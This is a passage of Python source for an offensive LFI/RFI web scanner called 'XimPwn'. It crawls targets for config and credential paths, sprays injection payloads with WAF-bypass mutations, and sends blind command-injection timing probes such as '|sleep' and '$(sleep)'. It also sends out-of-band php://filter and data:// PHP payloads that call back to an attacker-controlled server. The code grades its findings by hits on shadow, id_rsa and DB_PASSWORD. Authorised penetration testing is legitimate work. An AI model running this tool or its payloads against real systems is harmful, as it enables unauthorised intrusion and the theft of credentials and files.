        if "/" in payload and ".." in payload:
            mutations.append({"payload": payload.replace("/", "/**/"), "encoding": "waf-comment"})

        # Chunked encoding simulation (add junk params)
        mutations.append({"payload": payload, "encoding": "waf-chunked",
                          "extra": {"Transfer-Encoding": "chunked"}})

        # Null byte variants
        for null in ["%00", "%0a", "%0d", "%0d%0a", "%09"]:
            mutations.append({"payload": payload + null, "encoding": f"waf-null-{null}"})

        return mutations

    def _random_case(self, s: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


# ──────────────────────────────────────────────
# HTTP Client
# ──────────────────────────────────────────────

class HTTPClient:
    """Async HTTP client with session management and WAF detection."""

    def __init__(self, config: ScannerConfig, console: Console):
        self.config = config
        self.console = console
        self.session: aiohttp.ClientSession | None = None
        self.request_count = 0
        self.waf_engine = WAFEngine(config)
        self._baseline_response: bytes = b""
        self._baseline_length: int = 0
        self._waf_check_done = False

    async def init(self):
        jar = aiohttp.CookieJar()
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        connector = aiohttp.TCPConnector(limit=self.config.concurrency, ssl=False)

        # Build proxy connector
        if self.config.proxy:
            connector = aiohttp.TCPConnector(limit=self.config.concurrency, ssl=False)

        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=jar,
            headers=self.config.headers,
        )

        if self.config.cookie:
            for cookie in self.config.cookie.split(";"):
                cookie = cookie.strip()
                if "=" in cookie:
                    k, v = cookie.split("=", 1)
                    self.session.cookie_jar.update_cookies({k.strip(): v.strip()})

        if self.config.auth:
            auth = aiohttp.BasicAuth(*self.config.auth)
        else:
            auth = None

        self._auth = auth

    async def close(self):
        if self.session:
            await self.session.close()

    async def get_baseline(self, url: str):
        """Capture baseline response for comparison."""
        try:
            resp = await self._request("GET", url)
            if resp:
                self._baseline_response = resp
                self._baseline_length = len(resp)
        except Exception:
            pass

    async def send_payload(self, url: str, parameter: str, payload: str,
                           method: str = "GET", post_data: dict | None = None,
                           extra_headers: dict | None = None) -> tuple[int, bytes, dict]:
        """Send a test request with the given payload."""
        await asyncio.sleep(self.config.delay)

        # Inject payload into parameter
        if method == "GET":
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            params[parameter] = payload
            new_query = urllib.parse.urlencode(params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            try:
                body = await self._request("GET", test_url, extra_headers=extra_headers)
                status = 200  # _request returns body or None
                return status, body, {}
            except aiohttp.ClientResponseError as e:
                return e.status, e.message.encode() if isinstance(e.message, str) else b"", {}
            except Exception:
                return 0, b"", {}
        else:
            if post_data is None:
                post_data = {}
            post_data[parameter] = payload
            try:
                body = await self._request("POST", url, data=post_data, extra_headers=extra_headers)
                return 200, body, {}
            except Exception:
                return 0, b"", {}

    async def probe_timing(self, url: str, parameter: str, payload: str,
                           method: str = "GET") -> float:
        """Send a timing probe and return response time."""
        start = time.monotonic()
        await asyncio.sleep(self.config.delay)
        try:
            if method == "GET":
                parsed = urllib.parse.urlparse(url)
                params = dict(urllib.parse.parse_qsl(parsed.query))
                params[parameter] = payload
                new_query = urllib.parse.urlencode(params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                await self._request("GET", test_url)
            else:
                post_data = {parameter: payload}
                await self._request("POST", url, data=post_data)
        except Exception:
            pass
        return time.monotonic() - start

    async def _request(self, method: str, url: str, data: dict | None = None,
                       extra_headers: dict | None = None) -> bytes:
        """Make an HTTP request, handle proxy, auth, WAF detection."""
        headers = {}
        if extra_headers:
            headers.update(extra_headers)

        kwargs: dict[str, Any] = {"headers": headers}
        if data:
            kwargs["data"] = data
        if self.config.proxy:
            kwargs["proxy"] = self.config.proxy
        if self._auth:
            kwargs["auth"] = self._auth

        try:
            async with self.session.request(method, url, **kwargs) as resp:
                self.request_count += 1
                body = await resp.read()

                # WAF detection on first request
                if not self._waf_check_done:
                    self._waf_check_done = True
                    waf = self.waf_engine.detect(dict(resp.headers), body, resp.status)
                    if waf:
                        self.console.print(f"  [bold red]🛡️  WAF detected: {waf}[/bold red]")

                return body
        except aiohttp.ClientResponseError:
            raise
        except Exception:
            return b""

    async def get_with_timing(self, url: str) -> tuple[float, bytes]:
        """GET request, return (elapsed_seconds, body)."""
        start = time.monotonic()
        try:
            body = await self._request("GET", url)
        except Exception:
            body = b""
        return time.monotonic() - start, body


# ──────────────────────────────────────────────
# Crawler & Discovery
# ──────────────────────────────────────────────

class DiscoveryEngine:
    """Endpoint discovery, parameter finding, and technology fingerprinting."""

    COMMON_PARAMS = [
        "file", "page", "path", "include", "doc", "view", "cat", "dir",
        "style", "pdf", "template", "php_path", "img", "image", "show",
        "load", "content", "read", "source", "func", "ref", "link",
        "inc", "require", "require_once", "include_once", "pg", "txt",
    ]

    COMMON_PATHS = [
        "/", "/index.php", "/index.html", "/index.htm", "/index.jsp",
        "/index.asp", "/index.aspx", "/default.php", "/default.html",
        "/admin/", "/admin.php", "/login.php", "/login.html",
        "/config.php", "/config.inc.php", "/configuration.php",
        "/setup.php", "/install.php", "/admin/config.php",
        "/wp-login.php", "/wp-admin/", "/administrator/",
        "/.env", "/.htaccess", "/.git/config",
        "/robots.txt", "/sitemap.xml",
        "/api/", "/api/v1/", "/graphql",
        "/test/", "/debug/", "/console/",
        "/backup/", "/db/", "/database/",
        "/uploads/", "/images/", "/static/",
        "/cgi-bin/", "/shell.php", "/cmd.php",
        "/phpinfo.php", "/info.php", "/test.php",
        "/server-status", "/server-info",
        "/.well-known/security.txt",
    ]

    WP_PATHS = [
        "/wp-config.php", "/wp-login.php", "/wp-admin/",
        "/wp-content/themes/", "/wp-content/plugins/",
        "/wp-includes/", "/wp-content/debug.log",
    ]

    JOOMLA_PATHS = [
        "/configuration.php", "/administrator/", "/configuration.php~",
    ]

    DRUPAL_PATHS = [
        "/sites/default/settings.php", "/CHANGELOG.txt", "/core/CHANGELOG.txt",
    ]

    LARAVEL_PATHS = [
        "/.env", "/storage/logs/laravel.log",
        "/public/.env", "/bootstrap/cache/",
    ]

    def __init__(self, config: ScannerConfig, console: Console):
        self.config = config
        self.console = console

    async def discover_endpoints(self, base_url: str, http: HTTPClient) -> list[Endpoint]:
        """Discover injectable endpoints through crawling and path enumeration."""
        parsed = urllib.parse.urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        endpoints: list[Endpoint] = []

        # Phase 1: Technology detection + baseline
        tech = await self._detect_technology(origin, http)
        self.console.print(f"  [cyan]Detected technology: {tech}[/cyan]")

        # Phase 2: Crawl robots.txt and sitemap
        discovered_paths = await self._crawl_robots(origin, http)

        # Phase 3: Add CMS-specific paths
        paths = list(set(self.COMMON_PATHS + discovered_paths))
        if tech == "php":
            paths.extend(self.WP_PATHS)
            paths.extend(self.JOOMLA_PATHS)
            paths.extend(self.DRUPAL_PATHS)
            paths.extend(self.LARAVEL_PATHS)

        # Phase 4: Probe paths and discover parameters
        semaphore = asyncio.Semaphore(self.config.concurrency)
        tasks = []
        for path in paths:
            url = f"{origin}{path}"
            tasks.append(self._probe_endpoint(url, http, semaphore, tech))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Endpoint):
                endpoints.append(result)

        # Phase 5: Also test the original URL
        if base_url != origin:
            ep = Endpoint(url=base_url, technology=tech)
            # Try common params on original URL
            for param in self.COMMON_PARAMS:
                ep.params[param] = ""
            endpoints.append(ep)

        # Deduplicate
        seen_urls = set()
        unique = []
        for ep in endpoints:
            if ep.url not in seen_urls:
                seen_urls.add(ep.url)
                unique.append(ep)

        self.console.print(f"  [cyan]Discovered {len(unique)} endpoints[/cyan]")
        return unique

    async def _detect_technology(self, origin: str, http: HTTPClient) -> str:
        """Fingerprint the target's technology stack."""
        try:
            body = await http._request("GET", origin)
            body_text = body.decode("utf-8", errors="ignore").lower()
            headers_text = str(http.session.cookie_jar).lower() if http.session else ""

            # Check common indicators
            if any(x in body_text for x in ["wp-content", "wp-includes", "wordpress"]):
                return "php"  # WordPress is PHP
            if "joomla" in body_text or "com_content" in body_text:
                return "php"
            if "drupal" in body_text:
                return "php"
            if any(x in body_text for x in ["laravel", "illuminate"]):
                return "php"
            if any(x in body_text for x in [".asp", "aspx", "__viewstate"]):
                return "asp"
            if any(x in body_text for x in [".jsp", "tomcat", "java"]):
                return "java"
            if any(x in body_text for x in ["django", "csrfmiddleware", "__debug__"]):
                return "python"
            if any(x in body_text for x in ["express", "x-powered-by: express"]):
                return "nodejs"

            # Check for PHP in URL
            if ".php" in origin.lower():
                return "php"

            # Default
            return "generic"
        except Exception:
            return "generic"

    async def _crawl_robots(self, origin: str, http: HTTPClient) -> list[str]:
        """Parse robots.txt and sitemap.xml for paths."""
        paths = []
        for file_path in ["/robots.txt", "/sitemap.xml"]:
            try:
                url = origin + file_path
                body = await http._request("GET", url)
                text = body.decode("utf-8", errors="ignore")
                for line in text.split("\n"):
                    line = line.strip()
                    if line.lower().startswith("disallow:"):
                        path = line.split(":", 1)[1].strip()
                        if path and path != "/":
                            paths.append(path)
                    elif line.lower().startswith("sitemap:"):
                        sitemap_url = line.split(":", 1)[1].strip()
                        # Could recursively crawl sitemaps, but keep it simple
                        parsed = urllib.parse.urlparse(sitemap_url)
                        if parsed.path and parsed.path != "/":
                            paths.append(parsed.path)
            except Exception:
                continue
        return paths

    async def _probe_endpoint(self, url: str, http: HTTPClient,
                              semaphore: asyncio.Semaphore, tech: str) -> Endpoint | None:
        """Probe a single endpoint to check if it exists and find parameters."""
        async with semaphore:
            try:
                body = await http._request("GET", url)
                if not body or len(body) < 50:
                    return None

                text = body.decode("utf-8", errors="ignore")

                # Skip 404-like pages
                if any(x in text.lower() for x in ["404 not found", "page not found", "does not exist"]):
                    return None

                # Extract form parameters
                params = self._extract_form_params(text)

                # Also try common params even if not in forms
                for param in self.COMMON_PARAMS:
                    if param not in params:
                        params[param] = ""

                if params:
                    return Endpoint(
                        url=url,
                        params=params,
                        technology=tech,
                    )
                else:
                    # Still worth testing with common params
                    return Endpoint(
                        url=url,
                        params={p: "" for p in self.COMMON_PARAMS[:5]},
                        technology=tech,
                    )
            except Exception:
                return None

    def _extract_form_params(self, html: str) -> dict[str, str]:
        """Extract parameter names from HTML forms."""
        params = {}
        # Find form inputs
        input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
        for match in input_pattern.finditer(html):
            params[match.group(1)] = ""

        # Find select elements
        select_pattern = re.compile(r'<select[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
        for match in select_pattern.finditer(html):
            params[match.group(1)] = ""

        # Find textarea
        textarea_pattern = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
        for match in textarea_pattern.finditer(html):
            params[match.group(1)] = ""

        return params


# ──────────────────────────────────────────────
# OOB Collaborator
# ──────────────────────────────────────────────

class OOBServer:
    """Out-of-band callback handler."""

    def __init__(self, config: ScannerConfig, console: Console):
        self.config = config
        self.console = console
        self.callback_url = config.oob_server
        self.hits: list[dict] = []
        self._running = False

    async def poll(self, timeout: float = 30) -> dict:
        """Poll the OOB server for callbacks."""
        if not self.callback_url:
            return {"hit": False}

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.callback_url}/poll",
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    data = await resp.json()
                    if data.get("hits"):
                        self.hits.extend(data["hits"])
                        return {"hit": True, "source": data["hits"][0].get("source", "unknown")}
        except Exception:
            pass
        return {"hit": False}

    def generate_oob_payloads(self) -> list[dict]:
        """Generate OOB test payloads."""
        if not self.callback_url:
            return []

        token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        base = self.callback_url.rstrip("/")

        return [
            {
                "payload": f"{base}/{token}",
                "encoding": "oob-http",
                "token": token,
            },
            {
                "payload": f"php://filter/convert.base64-encode/resource=http://{urllib.parse.urlparse(base).netloc}/{token}",
                "encoding": "oob-php-filter",
                "token": token,
            },
            {
                "payload": f"data://text/plain;base64,{base64.b64encode(f'<?php file_get_contents(\"http://{urllib.parse.urlparse(base).netloc}/{token}\") ?>'.encode()).decode()}",
                "encoding": "oob-data-wrapper",
                "token": token,
            },
        ]


# ──────────────────────────────────────────────
# Scanner Orchestrator
# ──────────────────────────────────────────────

class Scanner:
    """Main scanner orchestrator."""

    def __init__(self, config: ScannerConfig):
        self.config = config
        # emoji=False: keep file contents like root:x:... literal (no :x: → ❌)
        # unicode ⚡/🔨 still renders fine.
        self.console = Console(emoji=False)
        self.thor = ThorUI(self.console, enabled=not config.no_thor)
        self.findings: list[Finding] = []
        self.payload_engine = PayloadEngine(config)
        self.detection = DetectionEngine(config)
        self.http = HTTPClient(config, self.console)
        self.discovery = DiscoveryEngine(config, self.console)
        self.oob = OOBServer(config, self.console)
        self.waf_engine = WAFEngine(config)
        self.semaphore = asyncio.Semaphore(config.concurrency)
        self._scan_start: float = 0
        self._cancelled = False

    async def run(self):
        """Execute the full scan pipeline."""
        self._print_banner()
        self._scan_start = time.monotonic()

        # Handle Ctrl+C gracefully (main thread on POSIX only)
        try:
            loop = asyncio.get_event_loop()
            loop.add_signal_handler(signal.SIGINT, lambda: self._handle_interrupt())
        except Exception:
            pass

        try:
            await self.http.init()
            await self._phase_discovery()
            await self._phase_baseline()
            await self._phase_injection()
            await self._phase_blind()
            if self.config.oob_server:
                await self._phase_oob()
        finally:
            await self.http.close()

        self._report()

    def _handle_interrupt(self):
        self._cancelled = True
        self.console.print("\n[bold yellow]⚠️  Scan interrupted. Generating report with findings so far...[/bold yellow]")
        self._report()
        sys.exit(0)

    async def _phase_discovery(self):
        """Phase 1: Discover endpoints and fingerprint technology."""
        self.console.print(Panel(
            "[bold cyan]Phase 1: Discovery[/bold cyan] — Thor scouts the realms",
            border_style="cyan"
        ))
        self.thor.phase_say("I scout the realms... show me your hidden paths!", mood="normal", color="cyan")

        endpoints = await self.discovery.discover_endpoints(self.config.url, self.http)
        self._endpoints = endpoints

        if not endpoints:
            self.console.print("[bold red]No endpoints discovered. Try adding more paths manually.[/bold red]")
            # At least test the original URL
            self._endpoints = [Endpoint(
                url=self.config.url,
                params={p: "" for p in DiscoveryEngine.COMMON_PARAMS[:10]},
            )]

        self.console.print(f"  [green]✓[/green] {len(endpoints)} injectable endpoints found")

    async def _phase_baseline(self):
        """Phase 2: Establish response baseline."""
        self.console.print(Panel(
            "[bold cyan]Phase 2: Baseline[/bold cyan] — Thor learns the land",
            border_style="cyan"
        ))

        try:
            await self.http.get_baseline(self.config.url)
            self.detection.baseline_length = self.http._baseline_length
            self.detection.baseline_hash = hashlib.md5(self.http._baseline_response).hexdigest()

            # Also compute a normalized baseline
            self.detection.compute_baseline(
                self.http._baseline_length,
                self.http._baseline_response
            )

            self.console.print(f"  [green]✓[/green] Baseline captured ({self.http._baseline_length} bytes)")
        except Exception as e:
            self.console.print(f"  [yellow]⚠ Baseline capture failed: {e}[/yellow]")

    async def _phase_injection(self):
        """Phase 3: Thor runs into battle — every payload flies from Mjolnir."""
        self.console.print(Panel(
            "[bold yellow]⚡ Phase 3: Thor Attacks — Injection Testing ⚡[/bold yellow]",
            border_style="yellow"
        ))

        # Collect all (endpoint, parameter, payload) combinations
        test_cases = []
        for endpoint in self._endpoints:
            tech = endpoint.technology if endpoint.technology != "generic" else "php"
            payloads = self.payload_engine.get_all_payloads_for_tech(tech)

            for param in endpoint.params:
                for payload_info in payloads:
                    test_cases.append((endpoint, param, payload_info))

                    # If WAF bypass enabled, add mutations
                    if self.config.waf_bypass and self.waf_engine.detected_waf:
                        mutations = self.waf_engine.apply_bypass_mutations(payload_info["payload"])
                        for mut in mutations:
                            test_cases.append((endpoint, param, mut))

        total = len(test_cases)
        self.console.print(f"  [cyan]Testing {total} payload combinations...[/cyan]")

        # Thor declares war — words burst from his mouth
        self.thor.attack_intro(total)

        completed = 0
        found = 0
        live = None
        use_thor_live = self.thor.enabled and total > 0

        def _refresh_live(cur_payload: str = "", cur_url: str = "", cur_param: str = ""):
            nonlocal live
            if live is None:
                return
            try:
                step = completed % 3  # running animation frames
                live.update(self.thor.render_attack(
                    cur_payload or "...", cur_url or self.config.url,
                    cur_param or "?", completed, total, step))
            except Exception:
                pass

        async def test_one(ep: Endpoint, param: str, payload_info: dict):
            nonlocal completed, found
            if self._cancelled:
                return

            async with self.semaphore:
                payload_str = payload_info["payload"]
                try:
                    # Show THIS payload inside Mjolnir as Thor runs
                    if use_thor_live:
                        _refresh_live(payload_str, ep.url, param)
                    elif self.config.verbose:
                        self.console.print(f"  [dim]⚡ ?{param}={payload_str[:70]}[/dim]")

                    body = await self.http.send_payload(
                        ep.url, param, payload_str,
                        method=ep.method,
                    )

                    if isinstance(body, tuple):
                        # Back-compat: some clients return (status, body, headers)
                        body = body[1] if len(body) > 1 else b""

                    if body:
                        is_vuln, evidence = self.detection.detect_content(
                            body, ep.url, payload_info
                        )
                        if is_vuln:
                            severity = self._assess_severity(payload_str, evidence)
                            finding = Finding(
                                url=ep.url,
                                parameter=param,
                                payload=payload_str,
                                vuln_type=self._classify_vuln(payload_str),
                                severity=severity,
                                evidence=evidence,
                                method=ep.method,
                                phase="injection",
                            )
                            self.findings.append(finding)
                            found += 1
                            # GREEN LIGHTNING — Thor roars FOUND, Mjolnir shows URL+payload
                            # (console.print is Live-safe: it renders above the running Thor)
                            try:
                                self.thor.found(ep.url, param, payload_str, evidence)
                            except Exception:
                                pass
                except Exception:
                    pass
                finally:
                    completed += 1
                    if use_thor_live:
                        _refresh_live(payload_str, ep.url, param)
                    else:
                        try:
                            progress.update(task, completed=completed)
                        except Exception:
                            pass

        if use_thor_live:
            # Thor RUNS while Mjolnir displays each attacking payload
            init_art = self.thor.render_attack("...", self.config.url, "?", 0, total, 0)
            with Live(init_art, console=self.console, refresh_per_second=8) as live_ctx:
                live = live_ctx
                # Execute in batches to manage memory
                batch_size = self.config.concurrency * 5
                for i in range(0, len(test_cases), batch_size):
                    if self._cancelled:
                        break
                    batch = test_cases[i:i + batch_size]
                    await asyncio.gather(*[
                        test_one(ep, param, payload_info)
                        for ep, param, payload_info in batch
                    ], return_exceptions=True)
                live = None
        else:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                console=self.console,
            ) as progress:
                task = progress.add_task("[blue]Scanning...[/blue]", total=total)
                # Execute in batches to manage memory
                batch_size = self.config.concurrency * 5
                for i in range(0, len(test_cases), batch_size):
                    if self._cancelled:
                        break
                    batch = test_cases[i:i + batch_size]
                    await asyncio.gather(*[
                        test_one(ep, param, payload_info)
                        for ep, param, payload_info in batch
                    ], return_exceptions=True)

        self.console.print(f"  [green]✓[/green] Injection complete. Found {found} potential vulnerabilities.")

    async def _phase_blind(self):
        """Phase 4: Time-based blind detection — Thor listens for echoes."""
        self.console.print(Panel(
            "[bold cyan]Phase 4: Blind Detection (Time-Based)[/bold cyan] — Thor listens",
            border_style="cyan"
        ))
        self.thor.phase_say("Shhh... now I listen for echoes in time itself...", mood="normal", color="cyan")

        # Determine sleep payloads based on tech
        sleep_payloads_linux = [
            ("|sleep {t}", "pipe-sleep"),
            ("||sleep {t}", "or-sleep"),
            ("&&sleep {t}", "and-sleep"),
            (";sleep {t}", "semicolon-sleep"),
            ("`sleep {t}`", "backtick-sleep"),
            ("$(sleep {t})", "dollar-sleep"),
        ]

        sleep_payloads_windows = [
            ("|timeout /t {t}", "pipe-timeout"),
            ("& timeout /t {t}", "amp-timeout"),
        ]

        blind_timeout = self.config.blind_timeout
        test_duration = self.config.timeout  # max per-request timeout

        # Collect blind test cases
        blind_tests = []
        for endpoint in self._endpoints:
            tech = endpoint.technology
            sleep_variants = sleep_payloads_linux.copy()
            if tech in ("windows", "iis", "generic"):
                sleep_variants.extend(sleep_payloads_windows)

            for param in endpoint.params:
                for payload_tmpl, enc_type in sleep_variants:
                    payload = payload_tmpl.format(t=min(blind_timeout, test_duration - 1))
                    blind_tests.append((endpoint, param, payload, enc_type))

        if not blind_tests:
            self.console.print("  [yellow]No blind tests configured.[/yellow]")
            return

        self.console.print(f"  [cyan]Running {len(blind_tests)} timing tests (threshold: {blind_timeout}s)...[/cyan]")

        # First, establish baseline timing
        self.console.print("  [cyan]Establishing timing baseline...[/cyan]")
        baseline_times = []
        base_url = self.config.url
        for _ in range(5):
            t = await self.http.probe_timing(base_url, "q", "normal")
            baseline_times.append(t)

        if not baseline_times:
            self.console.print("  [yellow]Could not establish timing baseline.[/yellow]")
            return

        self.console.print(f"  [cyan]Baseline median: {statistics.median(baseline_times):.2f}s[/cyan]")

        # Run blind tests
        found_blind = 0
        progress_text = "[blue]Blind testing...[/blue]"

        async def test_blind(ep: Endpoint, param: str, payload: str, enc_type: str):
            nonlocal found_blind
            if self._cancelled:
                return
            async with self.semaphore:
                try:
                    test_times = []
                    # Run 3 rounds for statistical significance
                    for _ in range(3):
                        t = await self.http.probe_timing(ep.url, param, payload, method=ep.method)
                        test_times.append(t)

                        # If a single response is way over threshold, early confirm
                        if t >= blind_timeout:
                            break

                    is_vuln, evidence = self.detection.detect_time_based(baseline_times, test_times)
                    if is_vuln:
                        finding = Finding(
                            url=ep.url,
                            parameter=param,
                            payload=payload,
                            vuln_type="Blind LFI",
                            severity="High",
                            evidence=evidence,
                            method=ep.method,
                            phase="blind",
                        )
                        self.findings.append(finding)
                        found_blind += 1
                        self.thor.blind_found(ep.url, param, payload)
                except Exception:
                    pass

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=self.console,
        ) as progress:
            task = progress.add_task(progress_text, total=len(blind_tests))

            completed = 0
            for ep, param, payload, enc_type in blind_tests:
                if self._cancelled:
                    break
                await test_blind(ep, param, payload, enc_type)
                completed += 1
                progress.update(task, completed=completed)

        self.console.print(f"  [green]✓[/green] Blind detection complete. Found {found_blind} potential blind vulnerabilities.")

    async def _phase_oob(self):
        """Phase 5: Out-of-band detection — Mjolnir thrown beyond the realms."""
        self.console.print(Panel(
            "[bold cyan]Phase 5: Out-of-Band Detection[/bold cyan] — Mjolnir flies far",
            border_style="cyan"
        ))
        self.thor.phase_say("I hurl Mjolnir beyond the realms... let it call back to me!",
                            mood="angry", color="cyan")

        oob_payloads = self.oob.generate_oob_payloads()
        if not oob_payloads:
            self.console.print("  [yellow]No OOB payloads generated.[/yellow]")
            return

        self.console.print(f"  [cyan]Sending {len(oob_payloads)} OOB probe payloads...[/cyan]")

        for endpoint in self._endpoints:
            for param in endpoint.params:
                for payload_info in oob_payloads:
                    if self._cancelled:
                        return
                    async with self.semaphore:
                        try:
                            await self.http.send_payload(
                                endpoint.url, param,
                                payload_info["payload"],
                                method=endpoint.method,
                            )
                        except Exception:
                            pass

        # Wait for callbacks
        self.console.print("  [cyan]Waiting for OOB callbacks...[/cyan]")
        await asyncio.sleep(10)

        result = await self.oob.poll(timeout=15)
        if result.get("hit"):
            finding = Finding(
                url=self.config.url,
                parameter="OOB",
                payload="OOB callback",
                vuln_type="OOB LFI",
                severity="Critical",
                evidence=result.get("source", "Callback received"),
                phase="oob",
            )
            self.findings.append(finding)
            self.thor.found(self.config.url, "OOB", "OOB callback",
                            result.get("source", "Callback received"))
        else:
            self.console.print("  [yellow]No OOB callbacks received.[/yellow]")

    def _assess_severity(self, payload: str, evidence: str) -> str:
        """Assess vulnerability severity based on payload and evidence."""
        # Critical: credential files, config files, keys
        critical_keywords = ["shadow", "id_rsa", "password", "DB_PASSWORD", "SECRET", "KEY"]
        if any(kw.lower() in payload.lower() or kw.lower() in evidence.lower()
               for kw in critical_keywords):
            return "Critical"

        # High: system files, logs, environment
        high_keywords = ["passwd", "environ", "cmdline", ".env", "config",
                         "win.ini", "SAM", "access.log", "error.log", "crontab"]
        if any(kw.lower() in payload.lower() or kw.lower() in evidence.lower()
               for kw in high_keywords):
            return "High"

        # Medium: general read
        if "root:" in evidence or "daemon:" in evidence:
            return "Medium"

        return "Low"

    def _classify_vuln(self, payload: str) -> str:
        """Classify the vulnerability type based on payload."""
        if "php://" in payload:
            return "LFI (PHP Wrapper)"
        if "data://" in payload:
            return "LFI (Data Wrapper)"
        if "expect://" in payload:
            return "RFI (Expect)"
        if "http://" in payload or "https://" in payload:
            return "RFI"
        if "log-poison" in payload:
            return "Log Poisoning"
        if "filter-chain" in payload or "convert.iconv" in payload:
            return "LFI (Filter Chain)"
        if "oob" in payload.lower():
            return "OOB LFI"
        return "LFI"

    def _print_banner(self):
        # Thor crashes onto the screen amid ASCII lightning
        if self.thor.enabled:
            self.thor.arrival(
                target=self.config.url,
                mode="Quick" if self.config.quick else "Full",
                waf="Enabled" if self.config.waf_bypass else "Disabled",
                oob=self.config.oob_server or "Disabled",
                concurrency=self.config.concurrency,
                timeout=self.config.timeout,
            )
            return
        banner = r"""
 ██████╗ ██╗███╗   ███╗ █████╗ ███████╗ ██████╗ ██╗   ██╗███╗   ███╗███████╗
██╔════╝ ██║████╗ ████║██╔══██╗╚══███╔╝██╔═══██╗██║   ██║████╗ ████║██╔════╝
██║  ███╗██║██╔████╔██║███████║  ███╔╝ ██║   ██║██║   ██║██╔████╔██║█████╗
██║   ██║██║██║╚██╔╝██║██╔══██║ ███╔╝  ██║   ██║██║   ██║██║╚██╔╝██║██╔══╝
╚██████╔╝██║██║ ╚═╝ ██║██║  ██║███████╗╚██████╔╝╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚═════╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚══════╝
"""
        info = (
            "[bold cyan]Target:[/bold cyan]  {target}\n"
            "[bold cyan]Mode:[/bold cyan]    {mode}\n"
            "[bold cyan]WAF Bypass:[/bold cyan] {waf}\n"
            "[bold cyan]OOB:[/bold cyan]      {oob}\n"
            "[bold cyan]Concurrency:[/bold cyan] {concurrency}\n"
            "[bold cyan]Timeout:[/bold cyan]    {timeout}s\n"
        ).format(
            target=self.config.url,
            mode="Quick" if self.config.quick else "Full",
            waf="Enabled" if self.config.waf_bypass else "Disabled",
            oob=self.config.oob_server or "Disabled",
            concurrency=self.config.concurrency,
            timeout=self.config.timeout,
        )
        panel = Panel(
            f"[bold magenta]{banner}[/bold magenta]\n"
            f"[bold yellow]Advanced LFI/RFI Scanner[/bold yellow]\n\n"
            f"{info}",
            title="[bold magenta]⚡ XimPwn Scanner ⚡[/bold magenta]",
            border_style="magenta",
            padding=(1, 2),
        )
        self.console.print(panel)

    def _report(self):
        """Generate and display final report — green or red lightning finale."""
        elapsed = time.monotonic() - self._scan_start
        self.console.print()
        self.console.print(Panel(
            f"[bold cyan]Scan Complete[/bold cyan] — {elapsed:.1f}s, "
            f"{self.http.request_count} requests sent",
            border_style="cyan",
        ))

        if not self.findings:
            # RED LIGHTNING — Thor apologises, words from his mouth
            self.thor.defeat()
            self.console.print(Panel(
                "[bold red]⚡ No vulnerabilities found. Thor returns to Asgard... for now.[/bold red]",
                border_style="red",
            ))
            self._write_output()
            return

        # GREEN LIGHTNING — Thor roars victory, Mjolnir shows the spoils
        self.thor.victory(len(self.findings))
        # Show the crown jewel inside Mjolnir: first finding's URL + payload
        top = self.findings[0]
        self.console.print(Panel(
            f"[bold white on green] 🔨 MJOLNIR PROOF: {rich_escape(top.url)}?"
            f"{rich_escape(top.parameter)}={rich_escape(top.payload[:80])} [/bold white on green]",
            title="⚡ Thor's Trophy ⚡",
            border_style="green",
            box=box.DOUBLE,
        ))

        # Terminal report
        if self.config.output_format == "terminal" or not self.config.output_file:
            self._print_terminal_report()

        # File output
        self._write_output()

    def _print_terminal_report(self):
        """Print rich terminal report."""
        # Severity summary
        severity_counts = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        summary = Table(title="📊 Summary", box=box.ROUNDED, border_style="cyan")
        summary.add_column("Severity", style="bold")
        summary.add_column("Count", justify="right")
        for sev in ["Critical", "High", "Medium", "Low"]:
            count = severity_counts.get(sev, 0)
            if count:
                style = {"Critical": "bold red", "High": "red", "Medium": "yellow", "Low": "green"}.get(sev, "")
                summary.add_row(f"[{style}]{sev}[/{style}]", str(count))
        summary.add_row("[bold]Total[/bold]", f"[bold]{len(self.findings)}[/bold]")
        self.console.print(summary)

        # Findings table
        table = Table(
            title="🎯 Vulnerability Findings",
            box=box.DOUBLE_EDGE,
            border_style="red",
            show_lines=True,
        )
        table.add_column("#", style="dim", width=4)
        table.add_column("Severity", width=10)
        table.add_column("Type", width=16)
        table.add_column("URL", width=40, overflow="ellipsis")
        table.add_column("Parameter", width=12)
        table.add_column("Payload", width=50, overflow="ellipsis")
        table.add_column("Evidence", width=60, overflow="ellipsis")

        for i, f in enumerate(self.findings, 1):
            sev_style = {
                "Critical": "bold white on red",
                "High": "bold red",
                "Medium": "yellow",
                "Low": "green",
            }.get(f.severity, "")

            table.add_row(
                str(i),
                f"[{sev_style}]{f.severity}[/{sev_style}]",
                f.vuln_type,
                f.url,
                f.parameter,
                f.payload[:50],
                f.evidence[:60] if f.evidence else "-",
            )

        self.console.print(table)

    def _write_output(self):
        """Write report to file based on configured format."""
        if not self.config.output_file:
            return

        fmt = self.config.output_format
        path = self.config.output_file

        if fmt == "json":
            self._write_json(path)
        elif fmt == "csv":
            self._write_csv(path)
        elif fmt == "html":
            self._write_html(path)
        else:
            self._write_json(path)

        self.console.print(f"\n  [green]📁 Report saved to {path}[/green]")

    def _write_json(self, path: str):
        data = {
            "scan_info": {
                "target": self.config.url,
                "timestamp": datetime.now(timezone.utc).isoformat(),
